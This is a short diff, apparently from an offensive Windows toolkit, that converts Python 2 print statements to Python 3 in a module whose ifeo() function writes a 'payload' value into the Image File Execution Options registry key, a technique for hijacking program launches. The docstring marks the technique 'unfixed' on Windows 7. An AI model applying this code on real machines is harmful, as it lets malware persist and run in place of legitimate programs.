@@ -2,6 +2,7 @@
 Works from: Windows 7
 Fixed in: unfixed
 """
+from __future__ import print_function
 import os
 import _winreg
 from colorama import init, Fore
@@ -22,7 +23,7 @@ def warningBox():
 	return (Fore.YELLOW + '[!]' + Fore.RESET)
 
 def ifeo(processname):
-	print " {} ifeo: Attempting to create registry key".format(infoBox())
+	print(" {} ifeo: Attempting to create registry key".format(infoBox()))
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
 					os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
@@ -33,7 +34,7 @@ def ifeo(processname):
 				_winreg.REG_SZ,
 				payload)
 		_winreg.CloseKey(key)
-		print " {} ifeo: Registry key created".format(successBox())
+		print(" {} ifeo: Registry key created".format(successBox()))
 	except Exception as error:
-		print " {} ifeo: Unable to create registry key".format(errorBox())
+		print(" {} ifeo: Unable to create registry key".format(errorBox()))
 		return False
